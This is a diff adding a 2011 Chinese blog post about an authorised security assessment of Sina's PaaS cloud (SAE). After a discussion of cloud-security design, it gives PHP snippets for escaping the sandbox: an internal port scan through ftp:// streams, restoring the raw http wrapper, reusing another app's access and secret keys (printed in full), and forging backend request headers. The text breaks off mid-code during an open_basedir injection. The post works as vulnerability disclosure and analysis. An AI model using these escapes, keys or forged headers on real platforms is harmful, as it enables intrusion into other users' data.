@@ -1,0 +1,940 @@
+<!DOCTYPE html>
+<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>从对SAE的一次授权安全评估浅谈云安全 - Nuclear&#39;Atk（核攻击）网络安全实验室</title>
+  
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta name="MobileOptimized" content="width"/>
+<meta name="HandheldFriendly" content="true"/>
+
+
+<meta name="applicable-device" content="pc,mobile">
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="author" content="80sec" /><meta name="description" content="从对SAE的一次授权安全评估浅谈云安全。由于国外的服务器访问较慢并且经常性的出现无法访问的情况，我们较早就与SAE合作将WooYun项目迁移至了较为稳定的SAE平台，后来与新浪SAE在安全方面也建立了合作关系，其中就包括此次安全评估测试。另外一方面，目前业界对云安全的讨论更多的都是在理论方面，很多的专家学者乃至安全研究人员和黑客都在讨论云安全，却很少有对实际的生产环境的云进行评估分析甚至入侵的案例，80sec也一直对云安全有自己的想法，但是缺乏实际的案例所以一直也没有相关的文档产出，我们在SAE对这些安全问题修复之后，经过SAE方面允许将此次对一个典型的paas云的评估过程公开，顺便提一些我们80sec在云安全方面的一些粗浅的想法，相关的一些详细安全问题也会被同步提交到乌云-漏洞报告平台上，说安全不如做安全：）" />
+<meta name="keywords" content="从对SAE的一次授权安全评估浅谈云安全" />
+
+
+
+<meta name="baidu-site-verification" content="GSIJv096Bu" />
+
+
+
+<meta name="generator" content="Hugo 0.82.0" />
+
+
+<link rel="canonical" href="https://lcx.cc/post/2347/" />
+
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/sass/jane.min.af20b78e95c84de86b00a0242a4a77bd2601700e1b250edf27537d957ac0041d.css" integrity="sha256-ryC3jpXITehrAKAkKkp3vSYBcA4bJQ7fJ1N9lXrABB0=" media="screen" crossorigin="anonymous">
+
+
+
+
+
+<meta property="og:title" content="从对SAE的一次授权安全评估浅谈云安全" />
+<meta property="og:description" content="从对SAE的一次授权安全评估浅谈云安全。由于国外的服务器访问较慢并且经常性的出现无法访问的情况，我们较早就与SAE合作将WooYun项目迁移至了较为稳定的SAE平台，后来与新浪SAE在安全方面也建立了合作关系，其中就包括此次安全评估测试。另外一方面，目前业界对云安全的讨论更多的都是在理论方面，很多的专家学者乃至安全研究人员和黑客都在讨论云安全，却很少有对实际的生产环境的云进行评估分析甚至入侵的案例，80sec也一直对云安全有自己的想法，但是缺乏实际的案例所以一直也没有相关的文档产出，我们在SAE对这些安全问题修复之后，经过SAE方面允许将此次对一个典型的paas云的评估过程公开，顺便提一些我们80sec在云安全方面的一些粗浅的想法，相关的一些详细安全问题也会被同步提交到乌云-漏洞报告平台上，说安全不如做安全：）" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://lcx.cc/post/2347/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2011-12-20T16:10:25&#43;08:00" />
+<meta property="article:modified_time" content="2011-12-20T16:10:25&#43;08:00" />
+
+<meta itemprop="name" content="从对SAE的一次授权安全评估浅谈云安全">
+<meta itemprop="description" content="从对SAE的一次授权安全评估浅谈云安全。由于国外的服务器访问较慢并且经常性的出现无法访问的情况，我们较早就与SAE合作将WooYun项目迁移至了较为稳定的SAE平台，后来与新浪SAE在安全方面也建立了合作关系，其中就包括此次安全评估测试。另外一方面，目前业界对云安全的讨论更多的都是在理论方面，很多的专家学者乃至安全研究人员和黑客都在讨论云安全，却很少有对实际的生产环境的云进行评估分析甚至入侵的案例，80sec也一直对云安全有自己的想法，但是缺乏实际的案例所以一直也没有相关的文档产出，我们在SAE对这些安全问题修复之后，经过SAE方面允许将此次对一个典型的paas云的评估过程公开，顺便提一些我们80sec在云安全方面的一些粗浅的想法，相关的一些详细安全问题也会被同步提交到乌云-漏洞报告平台上，说安全不如做安全：）"><meta itemprop="datePublished" content="2011-12-20T16:10:25&#43;08:00" />
+<meta itemprop="dateModified" content="2011-12-20T16:10:25&#43;08:00" />
+<meta itemprop="wordCount" content="6879">
+<meta itemprop="keywords" content="安全,云,app,cookie,FTP,Hash,HTTP,IE,IP,Mysql,PHP,Root,SQL,Web,wooyun,测试,代码,代码执行,分析,服务,函数,技术,监控,检测,漏洞,沙盒,数据,数据库,网络,文件,问题,系统,协议," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="从对SAE的一次授权安全评估浅谈云安全"/>
+<meta name="twitter:description" content="从对SAE的一次授权安全评估浅谈云安全。由于国外的服务器访问较慢并且经常性的出现无法访问的情况，我们较早就与SAE合作将WooYun项目迁移至了较为稳定的SAE平台，后来与新浪SAE在安全方面也建立了合作关系，其中就包括此次安全评估测试。另外一方面，目前业界对云安全的讨论更多的都是在理论方面，很多的专家学者乃至安全研究人员和黑客都在讨论云安全，却很少有对实际的生产环境的云进行评估分析甚至入侵的案例，80sec也一直对云安全有自己的想法，但是缺乏实际的案例所以一直也没有相关的文档产出，我们在SAE对这些安全问题修复之后，经过SAE方面允许将此次对一个典型的paas云的评估过程公开，顺便提一些我们80sec在云安全方面的一些粗浅的想法，相关的一些详细安全问题也会被同步提交到乌云-漏洞报告平台上，说安全不如做安全：）"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Nuclear'Atk</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+        
+      </li>
+    
+
+    
+  </ul>
+</nav>
+
+
+  
+    
+
+
+
+
+
+
+  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
+  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
+
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+  
+
+  
+
+  
+
+  <header id="header" class="header container">
+    <div class="logo-wrapper">
+  <a href="/" class="logo">
+    
+      Nuclear'Atk
+    
+  </a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+
+        
+
+      </li>
+    
+
+    
+    
+
+    
+  </ul>
+</nav>
+
+  </header>
+
+  <div id="mobile-panel">
+    <main id="main" class="main bg-llight">
+      <div class="content-wrapper">
+        <div id="content" class="content container">
+          <article class="post bg-white">
+    
+    <header class="post-header">
+      <h1 class="post-title">从对SAE的一次授权安全评估浅谈云安全</h1>
+      
+      <div class="post-meta">
+        <time datetime="2011-12-20" class="post-time">
+          2011-12-20
+        </time>
+        <div class="post-category">
+            <a href="https://lcx.cc/categories/%E8%80%81%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AE%B9/"> 老系统内容 </a>
+            <a href="https://lcx.cc/categories/%E5%AE%89%E5%85%A8/"> 安全 </a>
+            <a href="https://lcx.cc/categories/%E4%BA%91/"> 云 </a>
+            
+          </div>
+        <span class="more-meta"> 约 6879 字 </span>
+          <span class="more-meta"> 预计阅读 14 分钟 </span>
+
+        
+        
+
+        
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    
+  </div>
+</div>
+
+    
+    <div class="post-content">
+      
+<p style="text-indent:2em;">
+	EMail: jianxin#80sec.com
+</p>
+<p style="text-indent:2em;">
+	Site: http://www.80sec.com
+</p>
+<p style="text-indent:2em;">
+	Date: 2011-12-20
+</p>
+<p style="text-indent:2em;">
+	From: http://www.80sec.com/
+</p>
+<p style="text-indent:2em;">
+	<strong>[ 目录 ]</strong> 
+</p>
+<p style="text-indent:2em;">
+	一 背景及描述
+</p>
+<p style="text-indent:2em;">
+	二 什么是云
+</p>
+<p style="text-indent:2em;">
+	三 什么是云安全
+</p>
+<p style="text-indent:2em;">
+	四 如何对云进行安全设计
+</p>
+<p style="text-indent:2em;">
+	五 对SAE的一次授权安全评估检测
+</p>
+<p style="text-indent:2em;">
+	<strong>一 背景及简述</strong> 
+</p>
+<p style="text-indent:2em;">
+	由于国外的服务器访问较慢并且经常性的出现无法访问的情况，我们较早就与SAE合作将WooYun项目迁移至了较为稳定的SAE平台，后来与新浪SAE在安全方面也建立了合作关系，其中就包括此次安全评估测试。另外一方面，目前业界对云安全的讨论更多的都是在理论方面，很多的专家学者乃至安全研究人员和黑客都在讨论云安全，却很少有对实际的生产环境的云进行评估分析甚至入侵的案例，80sec也一直对云安全有自己的想法，但是缺乏实际的案例所以一直也没有相关的文档产出，我们在SAE对这些安全问题修复之后，经过SAE方面允许将此次对一个典型的paas云的评估过程公开，顺便提一些我们80sec在云安全方面的一些粗浅的想法，相关的一些详细安全问题也会被同步提交到乌云-漏洞报告平台上，说安全不如做安全：）
+</p>
+<p style="text-indent:2em;">
+	<strong>二 什么是云</strong> 
+</p>
+<p style="text-indent:2em;">
+	我们理解的云是一种新的资源使用方式，包括存储，数据，计算，网络……等等，这种资源相比传统的资源来讲，更接近一种基础能源，需要多少就用多少，类似于基础设施里的水和电的这种弹性，按照用多少进行付费，到目前为止，我们都很难对云有一个精确的定义，我们站在安全的角度只能粗浅的将云分为：
+</p>
+<p style="text-indent:2em;">
+	私有云：为企业内部业务服务的，具有无限计算能力和无限存储能力的云服务；
+</p>
+<p style="text-indent:2em;">
+	公有云：为外部用户提供服务的，在计算能力和存储能力不限的基础上，可能会与公司核心资源一起以saas的形式提供给外部用户服务的云；
+</p>
+<p style="text-indent:2em;">
+	同样，按照云实际的表现形式和作用又可以分为iaas，paas，saas，不同类型的云是资源本质上的不同，下一层为上一层服务，iaas提供网络和系统层面上的资源细粒度划分，paas依赖于iaas可以做到将存储，计算，数据等资源开放给第三方开发者，而借助paas提供的平台，可以在之上实现各种各样的软件层面的saas结合公司核心资源以给用户提供服务；
+</p>
+<p style="text-indent:2em;">
+	<strong>三 什么是云安全</strong> 
+</p>
+<p style="text-indent:2em;">
+	安全永远是对数据而言，安全的本质是数据的安全，包括可用，保密和不可篡改，安全上的一个挑战是云安全本质上改变了数据的处理方式，从传统的数据拥有者对安全负责变成数据处理者和数据拥有者同时对安全负责。
+</p>
+<p style="text-indent:2em;">
+	云安全带来的另外一个挑战是一个矛盾，对于使用者而言如果我要使用云，因为我可能会将敏感数据传到云上，我要先确保云是安全的，而如果我是一个云的建设者，我要对云安全负责，我得首先确认云里的数据处理和协作方式，而在数据规模和具体应用还不成熟的情况下，做到这一点会有难度，我无法保护一个威胁模型都不成熟的系统，所以目前一方面出现一个云安全先于云计算发展的局面，但是同时云安全因为云计算业务发展不够导致会处于一个理论和策略层面的情况；
+</p>
+<p style="text-indent:2em;">
+	不同的云，因为实际的业务目标和蕴含的数据不同，会有不同的安全威胁从而会有不同的云安全，譬如paas所需要考虑的东西和一个iaas需要考虑的安全会是完全不同的，同样私有云的安全目标和公有云的安全目标也会完全不同，依然是很久之前80sec提到的，不理解上下文的安全是没有意义的；
+</p>
+<p style="text-indent:2em;">
+	<strong>四 如何对云进行安全设计</strong> 
+</p>
+<p style="text-indent:2em;">
+	我相信任何一个事物的安全性会由如下方面造成，它本身蕴含的价值，这种价值所吸引带来的风险，是否有考虑到这种风险的防护及实际的解决方案，解决方案是否得到正确的实现，正确实现解决方案后是否形成有效的体系进行管理和运维，任何一个环节的缺失都会带来不安全性；
+</p>
+<p style="text-indent:2em;">
+	对于云，我们相信没有统一的云安全，所以只能选择一个目前较为典型的例子paas来谈我们对云安全设计的浅显看法，我们将考虑如下几个维度：
+</p>
+<p style="text-indent:2em;">
+	a) 资产价值：我们需要了解到该业务核心的价值所在，不同价值的数据会导致不同的安全威胁，譬如对于paas来讲，我们就很不赞成将私服（你懂的），银行等系统运行于paas之上，它不适合你，而且高价值的资产引入将提高云的风险；
+</p>
+<p style="text-indent:2em;">
+	b) 安全风险：特定的资产会遭受不同的安全风险，一个涉及国家机密的网站所可能承受的安全风险和一个个人Blog必定是完全不同的，分析我们所可能承受的风险，譬如拒绝服务，用户数据被非法访问，对内部网络的渗透等等；
+</p>
+<p style="text-indent:2em;">
+	c) 威胁建模：根据云可能承受的风险以及会造成这些风险的途径，重点在于分析系统的体系结构，安全域以及各安全域的边界，并且建立威胁模型譬如在paas云平台和internet的边界方面需要考虑的包括外网的网络攻击，恶意扫描等，对于用户数据和平台数据边界间应该考虑恶意代码对平台数据，甚至因为paas多用户的特殊性，应该考虑用户数据间边界的威胁；在这之外还要考虑平台对内部数据中心的影响；
+</p>
+<p style="text-indent:2em;">
+	d) 安全策略：基于上述的威胁建模，我们可以针对各种威胁进行必要的安全策略以杜绝和弱化风险，譬如要求在paas云边界上部署防火墙，在平台和内部网络之间部署入侵检测及监控系统；对于平台和用户以及用户与用户之间要求做到安全隔离等等；
+</p>
+<p style="text-indent:2em;">
+	e) 技术控制：对于策略如何能够具体的落实到执行，是一件较难的事情，同时也是最重要的一部分工作，大多数的企业也最缺少对这块的技术评估，没有足够的技术支撑，安全策略也只是一纸空文；这部分基本应该包括安全基线，访问控制，异常监控
+</p>
+<p style="text-indent:2em;">
+	可以看到，我们的安全设计是以数据和风险驱动的安全设计，以新浪云SAE为例，我们可以将涉及的数据按照属性和安全等级分为若干安全区域，各安全区域内实现相应等级的安全控制，区域间的访问行为需要受到严格的监控和审计：
+</p>
+<p style="text-indent:2em;">
+	a) 新浪内部数据（位于新浪IDC内部，未授权对新浪内部收据的访问将导致危害）
+</p>
+<p style="text-indent:2em;">
+	b) SAE平台数据（平台支撑整个用户数据的安全，安全等级较高）
+</p>
+<p style="text-indent:2em;">
+	c) SAE用户数据（可以再细化为用户数据A，用户数据B）
+</p>
+<p style="text-indent:2em;">
+	这几个区域的属性完全不同，对于访问需要做不同访问控制，对于内部数据，应该是和平台本身进行完全隔离，这部分可以通过划分独立的网络来进行控制，理论上我们信任内部网络，但是如果平台足够重要我们可以一样将其来自内部的访问和请求进行隔离；对于平台数据和用户之间应该是完全隔离，这部分是基于主机和一些后台服务的，所以可以通过网络和主机上的沙盒进行控制；对于用户之间的数据，因为安全性一样需要隔离，这部分需要在应用层实现一套隔离机制；对于平台和外网之间的隔离，我们需要严格防御譬如拒绝服务ddos以及一些常见的应用漏洞；
+</p>
+<p style="text-indent:2em;">
+	这几个部分如果没有做好，就会导致安全问题，我们无论是实现还是评估都是从这几个部分来考虑；
+</p>
+<p style="text-indent:2em;">
+	<strong>五 对SAE的一次授权安全评估检测</strong> 
+</p>
+<p style="text-indent:2em;">
+	我们的网站一直搭建在SAE平台上，无论是速度，稳定以及工作人员对问题的态度上都非常的不错，SAE之前和乌云有意展开一些合作包括对SAE的安全评估和检测，SAE安全防护很到位，对我们发现的问题都有过积极的反馈和修复，在得到SAE的允许之后这里我们将我们发现的问题做一些分享，相信对其他类似于paas的平台会有帮助
+</p>
+<p style="text-indent:2em;">
+	1 know it，了解我们的测试目标
+</p>
+<p style="text-indent:2em;">
+	按照我们对新浪云的粗略分析，数据会分为新浪内部数据，SAE平台数据和SAE用户数据，其中新浪内部数据主要是指IDC内部其他业务数据，平台数据包括平台的管理及运维以及相关的业务数据，用户数据主要是指用户上传至SAE的包括代码，数据库，存储等数据。按照我们的安全目标，这些数据之间应该相互隔离，不应该互相影响，不会被非法访问；
+</p>
+<p style="text-indent:2em;">
+	新浪对云的保护基本也分为几个方面，一方面是外部的防火墙实现sae与因特网的控制边界，在内部同样是使用了合适的ACL对内部数据进行了防护，我们非常关心的另外一方面也是paas所独有的一方面就是用户数据间的隔离和用户数据与云平台的隔离，这部分是最为复杂也是最为灵活的；SAE对用户数据间的隔离主要是不同用户间通过用户名和密码实现隔离，不同的应用之间通过access_key和secert_key来进行隔离，访问后端的数据库和存储等应用都必须提供access_key以及secert_key来进行；对于用户数据和平台之间的隔离主要包括所有资源的使用必须通过sae提供的接口进行，原生态的文件读写，网络请求都被禁止，而对于代码执行层，sae通过disable_function和open_basedir模拟了一个沙盒环境，以实现在执行态的沙盒保证用户无法对他资源之外的数据进行访问；
+</p>
+<p style="text-indent:2em;">
+	我们看到sae在这一块做的努力，我们也尝试对他进行了突破；
+</p>
+<p style="text-indent:2em;">
+	2 看看我们可以获得的资源
+</p>
+<p style="text-indent:2em;">
+	由于我们能够真正与sae及sae后端所蕴藏的丰富其他用户资源进行交互的，唯一的方式就是执行我们自己的代码，所以我们代码所处的环境和实际的限制对我们来说很重要，我们通过如下代码对系统进行了判断：
+</p>
+<pre class="prettyprint lang-php">&lt;?php
+
+$exts=get_loaded_extensions();
+$disables=ini_get("disable_functions");
+$disables=explode(",",$disables);
+
+$alls=get_defined_functions();
+
+$myfun=$alls['user'];
+
+for($i=0;$i&lt;count($alls['internal']);$i++){
+if(!in_array($alls['internal'][$i],$disables)){
+$myfun[]=$alls['internal'][$i];
+}
+}
+
+var_dump($myfun);
+
+?&gt;</pre>
+<p style="text-indent:2em;">
+	这是所有我们代码可执行的范围，也就是我们所有可能进行的交互，可以看到基本已经知道的可以突破沙箱的函数和方法都做了限制；
+</p>
+<p style="text-indent:2em;">
+	3 分析我们的环境
+</p>
+<p style="text-indent:2em;">
+	同时我们可以看到sae提供了phpinfo函数支持，那么我们通过phpinfo就可以简单判断当前的环境了，我们需要关心如下选项：
+</p>
+<pre class="prettyprint lang-php">Registered PHP Streams
+apache2handler
+Apache Environment
+
+open_basedir
+disable_functions
+
+auto_prepend_file</pre>
+<p style="text-indent:2em;">
+	这样我们大概了解了我们代码所处的运行环境，同时根据auto_prepend_file的提示我们知道在应用层sae做的一些事情，这里隐藏了太多的秘密包括后端服务的工作方式和sae制造的沙盒里可能有的一些空隙，毕竟这是跟我们的代码同一层所做的安全控制，而不是更底层，主要的包括网络请求的封装，后端资源访问的封装，而那个access_key和secert_key正是在这里起的作用；
+</p>
+<p style="text-indent:2em;">
+	4 攻击方式
+</p>
+<p style="text-indent:2em;">
+	我们的代码运行于一个open_basedir和disable_function环境中，这两个选项，正常情况下将我们的代码同文件系统以及操作系统隔离开来，使得我们处于一个受限的环境，同时由于在php这一层sae的代码优于我们的代码执行，所以在php代码层同样实现了一个沙箱，在这个沙箱内，我们与其他的任何资源的交互都会受到限制，譬如http请求和socks请求，而正常允许的连接譬如mysql，通过我们的测试，我们发现由于修改了底层的mysql代码，在sae代码执行环境里我们无法连接属于我们固有权限之外的任何数据，但是可以看到由于sae选择在应用层而不是更底层进行的沙箱，所以我们只要我们有可能选择到一些沙箱没有控制到的地方就可能绕过，同时如果沙箱本身实现得不好的话也可能导致产生问题。
+</p>
+<p style="text-indent:2em;">
+	先来看看沙箱是否可能漏洞的地方，我们可以简单的对允许使用的php函数进行一次遍历，发现了这么一个函数mb_send_mail并没有被禁用，80sec曾经提到要将mail函数禁用因为这将是php和底层系统进行交互的一个接口，而mb_send_mail同样只是对mail函数的一个封装，我们简单的测试之后证明的确可以利用该函数对底层系统进行读写，但是由于网络的一些原因我们得到了一个500错误，我们所需要的结果并没有如实的反馈给我们，但经过sae证实，该问题的确存在
+</p>
+<p style="text-indent:2em;">
+	另外，我们也观察到，sae支持的流非常多，但是真正被封装起来的其实只有一个http协议，封装的目的是对用户产生的请求能够进行控制，譬如限制访问的目的地址和对请求数量等做更精粒度的控制，而对于原生的譬如ftp协议并没有进行限制，这个时候其实我们可以利用这个做一个简单的内网端口扫描器：
+</p>
+<pre class="prettyprint lang-php">echo(file_get_contents('ftp://127.0.0.1:22/111'));</pre>
+<p style="text-indent:2em;">
+	由于sae对错误的处理偏向开发者太过有好，导致通过捕获错误，我们可以看到是否是网络不可达，端口未开放还是协议不匹配，这样我们甚至可以探测出sae与内部网络的隔离程度
+</p>
+<p style="text-indent:2em;">
+	ftp协议毕竟不是特别友好，而对于已经封装的http协议我们发现stream_wrapper_unregister和stream_wrapper_restore并没有禁用，于是通过这两个函数我们可以恢复原生的http请求，向所有我们想发起的地方发起http请求了：
+</p>
+<pre class="prettyprint lang-php">if ( in_array( "http", stream_get_wrappers() ) ) {
+stream_wrapper_unregister("http");
+}
+
+stream_wrapper_restore("http"));</pre>
+<p style="text-indent:2em;">
+	这只是对网络请求沙箱的一些突破，在实际的用户数据层，我们发现在后端用户是共用一些基本的服务的，譬如memcache，譬如mysql等，后端通过用户传递的access_key以及secert_key来识别用户，我们做了个很有意思的实验：
+</p>
+<pre class="prettyprint lang-php">define( 'SAE_ACCESSKEY', 'm0lm3wyxjyo' );
+define( 'SAE_SECRETKEY', '5d2dmz1xwyihjd2m3xzximw5wj30jix0djxl1c5i0iz5' );
+define( 'SAE_MYSQL_HOST_M', 'w.rdc.sae.sina.com.cn' );
+define( 'SAE_MYSQL_HOST_S', 'r.rdc.sae.sina.com.cn' );
+define( 'SAE_MYSQL_PORT', 3307 );
+define( 'SAE_MYSQL_USER', SAE_ACCESSKEY );
+define( 'SAE_MYSQL_PASS', SAE_SECRETKEY );
+define( 'SAE_MYSQL_DB', 'app_' . 'wscan' );
+
+var_dump(mysql_connect('r.rdc.sae.sina.com.cn:3307','m0lm3wyxjyo','5d2m1d0wfffyihj2m3xximw5wj30jix0jxlxl05i0iz5')); </pre>
+<p style="text-indent:2em;">
+	这个会提示
+</p>
+<p style="text-indent:2em;">
+	SAE_Warning: mysql_connect() [function.mysql-connect]: this app is not authorised in eval.php
+</p>
+<p style="text-indent:2em;">
+	似乎是底层的Mysql对连接的应用做了限制，不允许跨应用去连接数据库，但是我们知道除了在应用代码环境里可以去连接数据库，在SAE提供的面板里也是可以去进行数据库连接的，在控制面板里的实现即是通过access_key和secret_key在后台进行的连接，我们只要替换为我们获得的其他应用的相应key即可连接成功，这个沙箱似乎太简单了，还是没有做到应用只能访问到自己的数据这个原则，那么我们如何获得别人的access_key和secret_key呢，看看那个auto_prepend_file文件，这两个值是从HTTP请求里传递的，并且由于实现上的原因，这个内容在phpinfo里是直接可以看到的，上百度搜索一下sae，phpinfo吧……
+</p>
+<p style="text-indent:2em;">
+	到这里似乎我们可以了解到sae的一些机制和机制上的问题，但是都是用户之间的，我们很好奇为什么sae需要在http头里传递access_key和secert_key，这似乎比较难理解，在分析了sae的实现机制之后我们大概可以做如下理解，在前端接收到请求之后，会对请求做一些逻辑判断，譬如是否是有效的应用，应用资源是否超标等等，在做完有效性验证之后请求被转发到后端的执行层，执行环境所需要的一些数据譬如access_key和secert_key就是从这里传递到执行环境的，这里的好处是执行环境只负责执行，不用验证请求的合法性，任何应用的更改譬如禁用启用，增加删除不会影响到后端执行环境，但是这里就会有明显的问题，如果请求的合法性只在前端验证那么如果我们可以直接将请求转发到后端是可能影响到后端逻辑的正确性的，注意phpinfo里如下的信息：
+</p>
+<pre class="prettyprint lang-php">DOCUMENT_ROOT /data1/www/htdocs
+SERVER_ADMIN saesupport@sina.cn
+SCRIPT_FILENAME /data1/www/htdocs/549/wscan/1/phpinfo.php</pre>
+<p style="text-indent:2em;">
+	我们请求的是phpinfo.php，document_root是在/data1/www/htdocs，理论是上是无法映射到/data1/www/htdocs/549/wscan/1/phpinfo.php的，而且从这个路径我们推测，所有应用的执行代码都是处于/data1/www/htdocs/下面，所有的执行代码都是相同的用户身份运行的，因为一些原因sae并没有在设计上将所有用户的可执行代码做到隔离，隔离只是在执行层利用动态的映射和动态的限制来做的，这个机制是否存在问题呢，看如下精彩的代码：
+</p>
+<pre class="prettyprint lang-php">if ( in_array( "http", stream_get_wrappers() ) ) {
+stream_wrapper_unregister("http");
+}
+
+stream_wrapper_restore("http");
+
+$opt = array(
+'http' =&gt; array(
+'header' =&gt; "Host: wooyun.sinaapp.com\r\nX-Forwarded-For: 61.135.165.180, 61.135.165.180\r\nAppName: webmanage\r\nAccessKey: ynz0jyo1k1\r\nSecretKey: 1zhwzm5l4yilzyj54xiim5ddywwzzzz342l5lk5\r\nAppHash: 928\r\nMysqlPort: 3307\r\nAppCookie: default_version=1;xhprof=;debug=1;\r\nConnection: close\r\nCookie: saeut=220.181.50.244.1321955938519836\r\nAppVersion: 1",
+'protocol_version' =&gt; '1.1'
+)
+);
+stream_context_set_default($opt);
+$d = stream_context_get_default();
+var_dump(file_get_contents(http://10.67.15.23/phpinfo.php));</pre>
+<p style="text-indent:2em;">
+	我们利用之前突破http封装的方式实现了一个原生态的http请求，请求直接发往后端的可执行层代码，我们故意使用了别人的appname和apphash去请求一个phpinfo，结果发现正如我们的猜测，所有请求和请求的限制都是动态生成的，生成的原则就是基于appname和apphash等，譬如：
+</p>
+<p style="text-indent:2em;">
+	SCRIPT_FILENAME /data1/www/htdocs/549/wscan/1/phpinfo.php
+</p>
+<p style="text-indent:2em;">
+	就是基于请求的apphash和appname与DOCUMENT_ROOT一起决定请求的路径，从这种角度来讲，所有用户的资源更像是同一个站点下面的不同页面，理论上是可以获得其他用户资源的，我们尝试继续突破。既然请求路径是动态生成的，我们有理由相信open_basedir也是动态生成的，既然是动态生成的我们就可以进行一次史无前例的注射：
+</p>
+<p style="text-indent:2em;">
+	open_basedir 格式为：/dir/1:/dir/2
+</p>
+<p style="text-indent:2em;">
+	如果我们能产生一段open_basedir为/dir/1:/:/dir/2就可以突破对文件系统的沙箱了，同时这个请求还必须合法，因为我们请求的文件资源会和这个路径保持一致，我们可以建立一个名字为/:/:/的目录，结合../对目录进行遍历，我们是可以同时满足open_basedir和SCRIPT_FILENAME的要求的，最后让我们构造一个如下的请求：
+</p>
+<pre class="prettyprint lang-php">if ( in_array( "http", stream_get_wrappers() ) ) {
+stream_wrapper_unregister("http");
+}
+
+stream_wrapper_restore("http");
+
+$opt = array(
+'http' =&gt; array(
